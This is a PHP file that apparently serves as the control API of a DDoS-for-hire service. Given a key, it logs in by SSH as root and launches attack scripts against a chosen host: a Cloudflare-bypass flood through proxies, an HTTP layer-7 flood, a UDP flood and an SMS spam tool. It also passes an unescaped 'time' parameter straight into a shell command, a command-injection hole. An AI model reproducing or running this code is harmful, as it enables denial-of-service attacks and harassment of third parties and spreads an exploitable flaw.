<?php
//API BY KRITTKORN
define("SSH_IP", "127.0.0.1");
define("SSH_PORT", "22");
define("SSH_USER", "root");
define("SSH_PASSWORD", "@");

set_time_limit(0);

if(empty($_GET['host']) || empty($_GET['port']) || empty($_GET['time']) || empty($_GET['method']) || empty($_GET['key'])) die("APIDDOS : ONLINE");

$host = escapeshellcmd($_GET['host']);
$port = escapeshellcmd($_GET['port']);
$time = escapeshellcmd($_GET['time']);
$method = escapeshellcmd($_GET['method']);
$key = escapeshellcmd($_GET['key']);
if($_GET['key'] === "438890f9ca977beeefff0fd2f16f5bbd"){
	if(!function_exists("ssh2_connect")) die("Please install the SSH2 Dependency on the Linux Server First.");

if(!($con = ssh2_connect(SSH_IP, SSH_PORT))) die("Could not connect to SSH...");
else
{
	if(!ssh2_auth_password($con, SSH_USER, SSH_PASSWORD)) die("Invalid Credentials...\n");
    else
    {
		if($method == "BYPASS" || $method == "CFBYPASS")
    	{
	        if(!($stream = ssh2_exec($con, "screen -dm timeout {$_GET["time"]} python3.6 bypass.py ".$host." -x proxy.txt"))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "Attack Success!";
	        }
	    }
	    elseif($method == "HTTP" || $method == "HTTPGET")
    	{
	        if(!($stream = ssh2_exec($con, "screen -dm timeout {$_GET["time"]} perl layer7.pl ".$host." 500 500 127.0.0.1"))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "Attack Success!";
	        }
	    }
	    elseif($method == "spam" || $method == "SPAM")
    	{
	        if(!($stream = ssh2_exec($con, "screen -dm timeout {$_GET["time"]} python3.6 apispam.py ".$host))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "Spam SMS  : $host : Success!";
	        }
	    }
	    elseif($method == "STOP" || $method == "stop")
    	{
	        if(!($stream = ssh2_exec($con, "screen -s root -X quit"))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
				echo "STOP : ALL SUCCESS";
	        }
		}
		elseif($method == "px" || $method == "proxy")
    	{
	        if(!($stream = ssh2_exec($con, "python3.6 q.py proxy.txt 10000"))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "Generate Proxy : Success !";
	        }
		}
		elseif($method == "UDP" || $method == "udp")
    	{
	        if(!($stream = ssh2_exec($con, "screen -dms root ./UDP ".$host." ".$port." 1024 1024 ".$time))) die("Command couldn't be executed, something went wrong...\n");
	        else
	        {
	            echo "" . stream_get_contents($stream);
	            echo "Attack Success!";
	        }
		}
	    else die("Please Choose Method!");
    }

}
}else{
	die("Key Error");
}
?>